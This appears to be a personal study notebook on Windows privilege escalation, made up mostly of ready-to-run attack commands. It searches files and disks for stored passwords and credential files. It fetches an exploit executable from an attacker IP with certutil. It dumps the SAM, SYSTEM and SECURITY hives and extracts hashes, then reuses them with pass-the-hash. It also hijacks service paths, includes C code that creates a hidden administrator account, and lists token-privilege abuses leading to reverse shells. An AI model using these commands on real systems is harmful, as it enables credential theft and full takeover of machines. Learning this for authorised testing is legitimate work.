## 21082023Mon

```
findstr /SI password *.txt
```

```
findstr /si password *.txt
```

```
C:\Windows\System32>findstr /si password *.txt *.ini *.config
```

### Service Control

```
sc query windefend
```

```
sc queryex type=service
```

### Network Shell

```
netsh advfirewall firewall dump
```

```
netsh firewall show state
```

![[Pasted image 20230822070831.png]]

```
netsh advfirewall show currentprofile
```

![[Pasted image 20230822070650.png]]

## 22082023Tue

## Automated Enumeration Tools
### Executables
- winPEAS.exe https://github.com/carlospolop/PEASS-ng/releases
- Seatbelt.exe (compile) https://github.com/GhostPack/Seatbelt
- Watson.exe (compile) https://github.com/rasta-mouse/Watson
- SharpUp.exe (compile) https://github.com/GhostPack/SharpUp
### PowerShell
- Sherlock.ps1
- PowerUp.ps1
- jaws-enum.ps1
### Other
- windows-exploit-suggester.py (local)
- Exploit Suggester (Metasploit)

## 23082023Wed

```
net group /domain "Domain Admins"
```

```
net group /domain "Domain Controllers"
```

![[Windows Privilege Escalation.png]]

```
wmic computersystem LIST full
```

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```
cmdkey /list
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

```
whoami /all
```

```
whoami /priv
```

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe
```

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

![](Pasted%20image%2020231009024625.png)

![](Pasted%20image%2020231009024654.png)

```
samdump2 SYSTEM SAM
```

```
impacket-secretsdump -sam sam -security security -system system LOCAL
```

![](Pasted%20image%2020231009033039.png)

**Dumping local SAM hashes (uid:rid:lmhash:nthash)**

```
impacket-wmiexec -hashes LMHASH:NTHASH
```

```
sc config "software/service" binpath="\"C:\filelocation\customfile.exe\""
```

```
sc qc software/service
```

```
shutdown /r /t 0
```

*adduser.c*

```
#include <stdlib.h>
int main ()
{
	int i;
	i = system ("net user dave2 password123! /add");
	i = system ("net localgroup administrators dave2 /add");
	return 0;
}
```

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

- **Privileges**
    - Do we have SeShutdownPrivilege
        - Could lead to service exploitation.
    - Do we have *SeImpersonatePrivileges*
        - What system are we running on *systeminfo*
            - Can we use JuicyPotatoes, GodPotatos or PrintSpoofer.
    - Do we have *SeBackupPrivilege*, SeRestorePrivilege
        - Extract system and sam files to retrieve local hashes
    - Do we just have *SeRestorePrivilege*
        - Can we take over the administrator directory
            - https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
        - Can we use SeRestoreAbuse.exe and achieve a reverse shell
            - `.\SeRestoreAbuse.exe "cmd /c powershell.exe -Enc "`
    - Do we have *SeLoadDriverPrivilege*
        - Load a custom driver.
            - Capcom
    - Do we have *SeManageVolumePrivilege*
        - Can we use SeManageVolumeAbuse.exe to add a custom DLL
            - Copy a DLL file into the C:/Windows/System32/wbem location, this file should be called **tzres.dll**, if we run systeminfo it will trigger.


## Unquoted Service Path

```
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

